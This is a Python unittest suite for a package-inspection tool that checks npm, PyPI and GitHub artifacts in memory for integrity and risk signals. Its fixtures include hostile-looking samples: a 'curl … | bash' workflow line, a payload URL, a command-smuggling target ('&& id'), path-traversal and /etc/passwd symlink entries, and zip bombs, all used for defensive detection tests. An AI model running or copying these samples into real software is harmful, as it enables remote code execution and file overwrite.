"""Tests for tools/inspect_package.py: memory-only package inspection.

No network and no files: registries are replaced by an in-memory fetch function,
archives are built in memory, and the no-write test forbids open() and temp files.
"""

import base64
import datetime as dt
import hashlib
import importlib.util
import io
import json
import os
import stat
import sys
import tarfile
import tempfile
import unittest
import urllib.request
import zipfile
from pathlib import Path
from unittest import mock

sys.dont_write_bytecode = True

TOOL = Path(__file__).resolve().parent.parent / "tools" / "inspect_package.py"
_spec = importlib.util.spec_from_file_location("inspect_package", TOOL)
ip = importlib.util.module_from_spec(_spec)
sys.modules["inspect_package"] = ip
_spec.loader.exec_module(ip)

NOW = dt.datetime(2026, 9, 30, 12, 0, tzinfo=dt.timezone.utc)
SHA = "a" * 40
MIB = 1 << 20


def iso(days_ago):
    return (NOW - dt.timedelta(days=days_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def tar_bytes(entries, mode="w:gz", pax=None):
    """entries: (name, bytes) or (TarInfo, bytes-or-None)."""
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode=mode, format=tarfile.PAX_FORMAT, pax_headers=pax) as tf:
        for head, data in entries:
            if isinstance(head, str):
                head = tarfile.TarInfo(head)
                head.size = len(data)
            tf.addfile(head, io.BytesIO(data) if head.isreg() else None)
    return bio.getvalue()


def link(name, kind, target):
    info = tarfile.TarInfo(name)
    info.type, info.linkname = kind, target
    return info, None


def make_fetch(routes, calls=None):
    def fetch(url, cap, hosts, accept="*/*"):
        if calls is not None:
            calls.append(url)
        if url not in routes:
            raise ip.Stop("FETCH_ERROR", "HTTP 404 from " + url)
        body = routes[url]
        return body if isinstance(body, bytes) else json.dumps(body).encode()
    return fetch


def npm_routes(files, name="pkg", version="1.0.0", published_days=30, serve=None, base="https://registry.npmjs.org"):
    tgz = tar_bytes([("package/" + p, d) for p, d in files.items()])
    tarball = "%s/%s/-/%s-%s.tgz" % (base, name, name, version)
    dist = {"tarball": tarball, "integrity": "sha512-" + base64.b64encode(hashlib.sha512(tgz).digest()).decode(), "shasum": hashlib.sha1(tgz).hexdigest()}
    return {"%s/%s/%s" % (base, name, version): {"name": name, "version": version, "dist": dist},
            "%s/%s" % (base, name): {"time": {version: iso(published_days)}}, tarball: serve if serve is not None else tgz}


def pypi_routes(files, published_days=400, wheel=None):
    sdist = tar_bytes([("six-1.16.0/" + p, d) for p, d in files.items()])
    entry = lambda kind, fn, blob: {"packagetype": kind, "filename": fn, "url": "https://files.pythonhosted.org/packages/x/" + fn,
                                     "digests": {"sha256": hashlib.sha256(blob).hexdigest()}, "upload_time_iso_8601": iso(published_days)}
    urls = [entry("sdist", "six-1.16.0.tar.gz", sdist)]
    routes = {"https://files.pythonhosted.org/packages/x/six-1.16.0.tar.gz": sdist}
    if wheel is not None:
        urls.append(entry("bdist_wheel", "six-1.16.0-py2.py3-none-any.whl", wheel))
        routes["https://files.pythonhosted.org/packages/x/six-1.16.0-py2.py3-none-any.whl"] = wheel
    routes["https://pypi.org/pypi/six/1.16.0/json"] = {"info": {"name": "six", "version": "1.16.0"}, "urls": urls}
    return routes


def github_routes(tgz, api_ok=True, commit_days=1):
    routes = {"https://codeload.github.com/o/r/tar.gz/" + SHA: tgz}
    if api_ok:
        routes["https://api.github.com/repos/o/r/commits/" + SHA] = {"sha": SHA, "commit": {"committer": {"date": iso(commit_days)}}}
    return routes


def inspect(target, routes, **kw):
    return ip.inspect_target(target, make_fetch(routes), NOW, **kw)


def flags(report):
    return {f["code"] for f in report["flags"]}


class ExactVersionTests(unittest.TestCase):
    def test_accepts_exact_pins(self):
        self.assertEqual(ip.parse_target("esbuild@0.24.0"), ("npm", "esbuild", "0.24.0"))
        self.assertEqual(ip.parse_target("@scope/pkg@1.2.3-beta.1"), ("npm", "@scope/pkg", "1.2.3-beta.1"))
        self.assertEqual(ip.parse_target("six==1.16.0"), ("pypi", "six", "1.16.0"))
        self.assertEqual(ip.parse_target("Owner/Repo@" + SHA.upper()), ("github", "Owner/Repo", SHA))

    def test_refuses_ranges_tags_and_urls(self):
        for bad in ["esbuild@^0.24.0", "esbuild@~1.0.0", "esbuild@latest", "esbuild@0.24", "esbuild@1.x", "esbuild@>=1.0.0", "esbuild",
                    "six>=1.0", "six==1.*", "six===1.0", "six==latest", "six[extra]==1.0", "o/r@main", "o/r@v1.0.0", "o/r@" + SHA[:12],
                    "https://registry.npmjs.org/esbuild", "git+https://github.com/o/r", "pkg@1.0.0 && id", ""]:
            with self.subTest(bad=bad):
                with self.assertRaises(ip.Stop) as ctx:
                    ip.parse_target(bad)
                self.assertEqual(ctx.exception.status, "REFUSED")

    def test_refuses_non_https_and_non_official_hosts(self):
        routes = npm_routes({"index.js": b"1"})
        meta = routes["https://registry.npmjs.org/pkg/1.0.0"]
        for bad in ["http://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz", "https://evil.example/pkg.tgz", "https://registry.npmjs.org@evil.example/x.tgz"]:
            meta["dist"]["tarball"] = bad
            calls = []
            with self.subTest(url=bad), self.assertRaises(ip.Stop) as ctx:
                ip.inspect_target("pkg@1.0.0", make_fetch(routes, calls), NOW)
            self.assertEqual(ctx.exception.status, "REFUSED")
            self.assertNotIn(bad, calls)
        with self.assertRaises(ip.Stop):
            ip.check_url("https://codeload.github.com.evil.example/x", {"codeload.github.com"})
        with self.assertRaises(ip.Stop):  # a redirect to another host is refused
            ip._Redirect({"registry.npmjs.org"}).redirect_request(urllib.request.Request("https://registry.npmjs.org/x"), None, 302, "", {}, "https://evil.example/x")

    def test_registry_override_is_https_npm_only(self):
        for bad in ["http://npm.example.test", "https://user:pw@npm.example.test", "https://npm.example.test/?x=1"]:
            with self.subTest(bad=bad), self.assertRaises(ip.Stop):
                inspect("pkg@1.0.0", {}, registry=bad)
        with self.assertRaises(ip.Stop):
            inspect("six==1.16.0", {}, registry="https://npm.example.test")
        routes = npm_routes({"index.js": b"1"}, base="https://npm.example.test")
        report, _ = inspect("pkg@1.0.0", routes, registry="https://npm.example.test")
        self.assertEqual(report["integrity"]["status"], "VERIFIED")
        routes["https://npm.example.test/pkg/1.0.0"]["dist"]["tarball"] = "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"
        with self.assertRaises(ip.Stop):  # the override host is the only allowed host
            inspect("pkg@1.0.0", routes, registry="https://npm.example.test")


class HostileArchiveTests(unittest.TestCase):
    def test_tar_unsafe_entries_are_flagged_and_not_followed(self):
        dev = tarfile.TarInfo("dev/null")
        dev.type = tarfile.CHRTYPE
        data = tar_bytes([("../../evil.txt", b"x"), ("/etc/cron.d/job", b"y"), link("pkg/l", tarfile.SYMTYPE, "/etc/passwd"),
                          link("pkg/h", tarfile.LNKTYPE, "../../etc/shadow"), (dev, None), ("pkg/ok.txt", b"fine")])
        with mock.patch("builtins.open", side_effect=AssertionError("open() must not be called")):
            arc = ip.read_archive(data, ip.DEFAULT_CAPS)
        by_path = {e["path"]: e for e in arc.entries}
        codes = {(f["code"], f["path"]) for f in arc.flags}
        self.assertIn(("path_traversal", "../../evil.txt"), codes)
        self.assertIn(("absolute_path", "/etc/cron.d/job"), codes)
        self.assertIn(("symlink", "pkg/l"), codes)
        self.assertIn(("hardlink", "pkg/h"), codes)
        self.assertIn(("device", "dev/null"), codes)
        for path in ("pkg/l", "pkg/h", "dev/null"):  # recorded, never read or hashed
            self.assertIsNone(by_path[path]["sha256"])
        self.assertEqual(by_path["pkg/ok.txt"]["sha256"], hashlib.sha256(b"fine").hexdigest())
        self.assertIn("/etc/passwd", next(f["detail"] for f in arc.flags if f["code"] == "symlink"))

    def test_zip_unsafe_entries(self):
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("../up.txt", "x")
            zf.writestr("/abs.txt", "x")
            info = zipfile.ZipInfo("l")
            info.create_system, info.external_attr = 3, (stat.S_IFLNK | 0o777) << 16
            zf.writestr(info, "/etc/passwd")
        arc = ip.read_archive(bio.getvalue(), ip.DEFAULT_CAPS)
        self.assertEqual({f["code"] for f in arc.flags}, {"path_traversal", "absolute_path", "symlink"})
        self.assertIsNone(next(e for e in arc.entries if e["path"] == "l")["sha256"])

    def test_oversize_entry_is_flagged_and_reading_continues(self):
        data = tar_bytes([("big.bin", b"a" * 5000), ("small.txt", b"ok")])
        arc = ip.read_archive(data, dict(ip.DEFAULT_CAPS, entry=1024))
        self.assertIn("oversize_entry", {f["code"] for f in arc.flags})
        self.assertIsNone(next(e for e in arc.entries if e["path"] == "big.bin")["sha256"])
        self.assertIsNotNone(next(e for e in arc.entries if e["path"] == "small.txt")["sha256"])

    def test_zip_bomb_ratio_is_flagged_and_total_cap_stops_reading(self):
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("zeros.bin", b"\0" * (20 * MIB))
            zf.writestr("after.txt", "x")
        data = bio.getvalue()
        self.assertLess(len(data), 100000)
        arc = ip.read_archive(data, ip.DEFAULT_CAPS)
        self.assertIn("high_compression_ratio", {f["code"] for f in arc.flags})
        arc = ip.read_archive(data, dict(ip.DEFAULT_CAPS, total=2 * MIB))
        self.assertEqual(arc.truncated, ["total_size_limit"])
        self.assertNotIn("after.txt", {e["path"] for e in arc.entries})

    def test_tar_gz_bomb_hits_total_cap_and_result_is_partial(self):
        bomb = tar_bytes([("zeros.bin", b"\0" * (20 * MIB))])
        arc = ip.read_archive(bomb, dict(ip.DEFAULT_CAPS, total=MIB))
        self.assertEqual(arc.truncated, ["total_size_limit"])
        report, _ = inspect("pkg@1.0.0", npm_routes({"zeros.bin": b"\0" * (20 * MIB)}), caps=dict(ip.DEFAULT_CAPS, total=MIB))
        self.assertEqual(report["result"]["status"], "PARTIAL")
        self.assertIn("limit_reached", flags(report))
        self.assertFalse(report["inventory"]["complete"])

    def test_entry_count_cap_for_tar_and_zip(self):
        arc = ip.read_archive(tar_bytes([("f%d" % i, b"x") for i in range(30)]), dict(ip.DEFAULT_CAPS, entries=10))
        self.assertEqual((arc.truncated, len(arc.entries)), (["entry_limit"], 10))
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            for i in range(30):
                zf.writestr("f%d" % i, "x")
        self.assertEqual(ip.read_archive(bio.getvalue(), dict(ip.DEFAULT_CAPS, entries=10)).truncated, ["entry_limit"])

    def test_binaries_are_flagged(self):
        arc = ip.read_archive(tar_bytes([("bin/tool", b"\x7fELF\x02\x01" + b"\0" * 40), ("lib/a.node", b"\0" * 20), ("logo.png", b"\x89PNG\r\n\x1a\n\0\0"), ("a.txt", b"hi")]), ip.DEFAULT_CAPS)
        self.assertEqual({f["path"] for f in arc.flags if f["code"] == "binary_file"}, {"bin/tool", "lib/a.node"})

    def test_corrupt_archives_are_reported_not_a_crash(self):
        noise = b"".join(hashlib.sha256(bytes([i])).digest() for i in range(200))  # incompressible
        for data in (b"not an archive at all", b"PK\x03\x04 truncated zip", tar_bytes([("a", noise)])[:1500]):
            arc = ip.read_archive(data, ip.DEFAULT_CAPS)
            self.assertTrue(arc.errors, data[:12])


class IntegrityTests(unittest.TestCase):
    def test_verified_download_reports_digests(self):
        report, _ = inspect("pkg@1.0.0", npm_routes({"index.js": b"1"}))
        self.assertEqual(report["integrity"]["status"], "VERIFIED")
        self.assertEqual({c["algorithm"] for c in report["integrity"]["checks"]}, {"sha512", "sha1"})
        self.assertEqual(report["result"]["status"], "OK")

    def test_npm_integrity_mismatch_fails_but_keeps_inventory(self):
        other = tar_bytes([("package/evil.js", b"boom")])
        out = io.StringIO()
        code = ip.main(["pkg@1.0.0"], fetch=make_fetch(npm_routes({"index.js": b"1"}, serve=other)), out=out, err=io.StringIO(), now=NOW)
        report = json.loads(out.getvalue())
        self.assertEqual((code, report["result"]["status"], report["integrity"]["status"]), (4, "VERIFICATION_FAILED", "MISMATCH"))
        self.assertTrue(any(not c["match"] for c in report["integrity"]["checks"]))
        self.assertEqual([e["path"] for e in report["inventory"]["entries"]], ["package/evil.js"])

    def test_pypi_sha256_mismatch(self):
        routes = pypi_routes({"setup.py": b"x"})
        routes["https://files.pythonhosted.org/packages/x/six-1.16.0.tar.gz"] = tar_bytes([("six-1.16.0/setup.py", b"tampered")])
        report, _ = inspect("six==1.16.0", routes)
        self.assertEqual((report["result"]["status"], report["integrity"]["status"]), ("VERIFICATION_FAILED", "MISMATCH"))

    def test_registry_answering_for_another_version_fails(self):
        routes = npm_routes({"a": b"x"})
        routes["https://registry.npmjs.org/pkg/1.0.0"]["version"] = "9.9.9"
        with self.assertRaises(ip.Stop) as ctx:
            inspect("pkg@1.0.0", routes)
        self.assertEqual(ctx.exception.status, "VERIFICATION_FAILED")

    def test_github_records_sha256_and_checks_commit_id_in_archive(self):
        good = tar_bytes([("r-%s/README.md" % SHA, b"hi")], pax={"comment": SHA})
        report, _ = inspect("o/r@" + SHA, github_routes(good))
        self.assertEqual(report["integrity"]["status"], "NOT_PUBLISHED_UPSTREAM")
        self.assertEqual(report["integrity"]["archive_sha256"], hashlib.sha256(good).hexdigest())
        self.assertEqual((report["identity"][0]["match"], report["result"]["status"]), (True, "OK"))
        bad = tar_bytes([("r/README.md", b"hi")], pax={"comment": "b" * 40})
        report, _ = inspect("o/r@" + SHA, github_routes(bad))
        self.assertEqual(report["result"]["status"], "VERIFICATION_FAILED")
        report, _ = inspect("o/r@" + SHA, github_routes(tar_bytes([("r/README.md", b"hi")])))
        self.assertEqual(report["result"]["status"], "PARTIAL")


class EvidenceTests(unittest.TestCase):
    FILES = {
        "package.json": json.dumps({"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "node install.js", "test": "node t.js"},
                                    "bin": {"pkg": "bin/pkg.js"}, "dependencies": {"left": "^1.0.0", "evil": "github:someone/evil"}}).encode(),
        "install.js": b"// see https://cdn.example.com/payload.js and 10.1.2.3\nrequire('child_process');\n",
        ".mcp.json": json.dumps({"mcpServers": {"remote": {"command": "npx", "args": ["-y", "some-server"], "env": {"TOKEN": "hunter2hunter2"}},
                                                "web": {"url": "https://user:s3cretpass@mcp.example.com/sse"}}}).encode(),
        ".claude/settings.json": json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "sh ./hook.sh"}]}]}}).encode(),
        ".github/workflows/ci.yml": b"on:\n  pull_request_target:\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n      - run: curl -fsSL https://example.com/i.sh | bash\n",
    }

    def setUp(self):
        self.report, _ = inspect("pkg@1.0.0", npm_routes(self.FILES))
        self.text = json.dumps(self.report)

    def test_lifecycle_bin_and_dependencies(self):
        manifest = self.report["install_evidence"]["npm_manifest"]
        self.assertEqual(manifest["lifecycle_scripts"], ["postinstall"])
        self.assertEqual(manifest["scripts"]["postinstall"], "node install.js")
        self.assertEqual(manifest["bin"], {"pkg": "bin/pkg.js"})
        self.assertEqual(manifest["dependencies"]["dependencies"]["evil"], "github:someone/evil")
        self.assertTrue({"lifecycle_script", "non_registry_dependency"} <= flags(self.report))

    def test_mcp_agent_hook_and_workflow_files_are_surfaced_without_secrets(self):
        agent = {a["path"]: a for a in self.report["install_evidence"]["agent_and_hook_files"]}
        servers = {s["name"]: s for s in agent["package/.mcp.json"]["summary"]["mcp_servers"]}
        self.assertEqual((servers["remote"]["command"], servers["remote"]["args"]), ("npx", ["-y", "some-server"]))
        self.assertEqual(agent["package/.claude/settings.json"]["summary"]["hook_commands"], ["sh ./hook.sh"])
        workflow = self.report["install_evidence"]["ci_workflows"][0]
        self.assertTrue(workflow["pull_request_target"] and workflow["pipes_to_shell"])
        self.assertEqual(workflow["unpinned_actions"], ["actions/checkout@v4"])
        self.assertTrue({"agent_or_hook_file", "workflow_pull_request_target", "workflow_pipes_to_shell"} <= flags(self.report))
        for secret in ("hunter2hunter2", "s3cretpass"):
            self.assertNotIn(secret, self.text)

    def test_url_and_ip_leads_carry_path_and_line(self):
        urls = {u["url"]: u for u in self.report["network_literals"]["urls"]}
        self.assertEqual(urls["https://cdn.example.com/payload.js"]["first_seen"], ["package/install.js:1"])
        self.assertEqual(urls["https://cdn.example.com/payload.js"]["host"], "cdn.example.com")
        self.assertEqual(self.report["network_literals"]["ips"][0]["ip"], "10.1.2.3")
        self.assertIn("https://REDACTED@mcp.example.com/sse", urls)
        self.assertEqual(urls["https://REDACTED@mcp.example.com/sse"]["host"], "mcp.example.com")

    def test_python_build_hooks(self):
        files = {"setup.py": b"from setuptools import setup\nsetup()\n", "pyproject.toml": b'[build-system]\nrequires = ["setuptools"]\nbuild-backend = "backend"\nbackend-path = ["."]\n'}
        report, _ = inspect("six==1.16.0", pypi_routes(files))
        build = report["install_evidence"]["python_build"]
        self.assertIn("setup.py", build)
        self.assertEqual(build["pyproject.toml"]["build_backend"], "backend")
        self.assertIn("build_hook", flags(report))

    def test_pyproject_backend_path_alone_is_a_build_hook(self):
        report, _ = inspect("six==1.16.0", pypi_routes({"pyproject.toml": b'[build-system]\nbuild-backend = "b"\nbackend-path = ["src"]\n'}))
        self.assertEqual(flags(report), {"build_hook"})

    def test_pypi_wheel_selection(self):
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("six.py", "x = 1\n")
        report, _ = inspect("six==1.16.0", pypi_routes({"setup.py": b"x"}, wheel=bio.getvalue()), wheel=True)
        self.assertEqual((report["inventory"]["format"], report["artifact"]["filename"]), ("zip", "six-1.16.0-py2.py3-none-any.whl"))
        with self.assertRaises(ip.Stop):
            inspect("pkg@1.0.0", npm_routes({"a": b"x"}), wheel=True)


class ReleaseAgeTests(unittest.TestCase):
    def test_younger_and_older_than_14_days(self):
        young, _ = inspect("pkg@1.0.0", npm_routes({"a": b"x"}, published_days=3))
        old, _ = inspect("pkg@1.0.0", npm_routes({"a": b"x"}, published_days=30))
        self.assertEqual((young["release_age"]["age_days"], young["release_age"]["younger_than_policy"]), (3.0, True))
        self.assertEqual((old["release_age"]["age_days"], old["release_age"]["younger_than_policy"]), (30.0, False))
        self.assertEqual(young["release_age"]["policy_days"], 14)

    def test_github_age_uses_commit_date_and_missing_api_is_not_established(self):
        tgz = tar_bytes([("r/a", b"x")], pax={"comment": SHA})
        with_api, _ = inspect("o/r@" + SHA, github_routes(tgz, commit_days=2))
        self.assertTrue(with_api["release_age"]["younger_than_policy"])
        self.assertIn("weak", with_api["release_age"]["reliability"])
        without, _ = inspect("o/r@" + SHA, github_routes(tgz, api_ok=False))
        self.assertEqual((without["release_age"]["status"], without["result"]["status"]), ("NOT_ESTABLISHED", "PARTIAL"))


class OutputTests(unittest.TestCase):
    def test_json_is_deterministic_with_fixed_key_order_and_explicit_limits(self):
        runs = []
        for _ in range(2):
            out = io.StringIO()
            code = ip.main(["pkg@1.0.0"], fetch=make_fetch(npm_routes({"index.js": b"1"})), out=out, err=io.StringIO(), now=NOW)
            runs.append(out.getvalue())
        self.assertEqual((code, runs[0]), (0, runs[1]))
        report = json.loads(runs[0])
        self.assertEqual(list(report)[:8], ["tool", "result", "target", "source", "fetch", "artifact", "integrity", "identity"])
        self.assertIn("nothing was executed", report["limits"][0])
        self.assertIn("Not a malware verdict", report["limits"][0])
        self.assertTrue(report["fetch"]["memory_only"])

    def test_refusal_is_a_json_document_with_exit_2(self):
        out, err = io.StringIO(), io.StringIO()
        code = ip.main(["esbuild@^0.24.0"], fetch=make_fetch({}), out=out, err=err, now=NOW)
        self.assertEqual((code, json.loads(out.getvalue())["result"]["status"]), (2, "REFUSED"))

    def test_show_prints_escaped_redacted_text_and_refuses_binary(self):
        token = "ghp_" + "A" * 36
        files = {"install.js": ("console.log('a');\x1b[31m\u202e // %s\n" % token).encode(), "blob.bin": b"\0\1\2\3"}
        run = lambda path: (lambda o, e: (ip.main(["pkg@1.0.0", "--show", path], fetch=make_fetch(npm_routes(files)), out=o, err=e, now=NOW), o.getvalue(), e.getvalue()))(io.StringIO(), io.StringIO())
        code, out, err = run("install.js")
        self.assertEqual(code, 0)
        self.assertIn("\\x1b", out)
        self.assertIn("[U+202E]", out)
        self.assertIn("[REDACTED]", out)
        for raw in ("\x1b", "\u202e", token):
            self.assertNotIn(raw, out)
        self.assertIn("integrity: VERIFIED", out)
        self.assertEqual(run("blob.bin")[0], 2)
        self.assertEqual(run("missing.js")[0], 2)


class NoDiskWriteTests(unittest.TestCase):
    def test_full_run_never_opens_or_creates_files(self):
        hostile = tar_bytes([("../../evil", b"x"), link("package/l", tarfile.SYMTYPE, "/etc/passwd"), ("package/package.json", b'{"name":"pkg","version":"1.0.0","scripts":{"install":"x"}}')])
        routes = npm_routes({"index.js": b"1"})
        routes["https://registry.npmjs.org/pkg/1.0.0"]["dist"]["integrity"] = "sha512-" + base64.b64encode(hashlib.sha512(hostile).digest()).decode()
        routes["https://registry.npmjs.org/pkg/1.0.0"]["dist"]["shasum"] = hashlib.sha1(hostile).hexdigest()
        routes[routes["https://registry.npmjs.org/pkg/1.0.0"]["dist"]["tarball"]] = hostile
        boom = mock.Mock(side_effect=AssertionError("file system access is forbidden"))
        with tempfile.TemporaryDirectory() as tmp:
            previous = os.getcwd()
            os.chdir(tmp)
            try:
                with mock.patch("builtins.open", boom), mock.patch("io.open", boom), mock.patch("os.open", boom), mock.patch("os.mkdir", boom), \
                        mock.patch("os.makedirs", boom), mock.patch("tempfile.mkstemp", boom), mock.patch("tempfile.mkdtemp", boom), \
                        mock.patch("tempfile.NamedTemporaryFile", boom), mock.patch("tempfile.TemporaryFile", boom):
                    out = io.StringIO()
                    code = ip.main(["pkg@1.0.0"], fetch=make_fetch(routes), out=out, err=io.StringIO(), now=NOW)
                    shown = ip.main(["pkg@1.0.0", "--show", "package.json"], fetch=make_fetch(routes), out=io.StringIO(), err=io.StringIO(), now=NOW)
            finally:
                os.chdir(previous)
            self.assertEqual(os.listdir(tmp), [])
        self.assertEqual((code, shown), (0, 0))
        self.assertIn("path_traversal", out.getvalue())


if __name__ == "__main__":
    unittest.main()
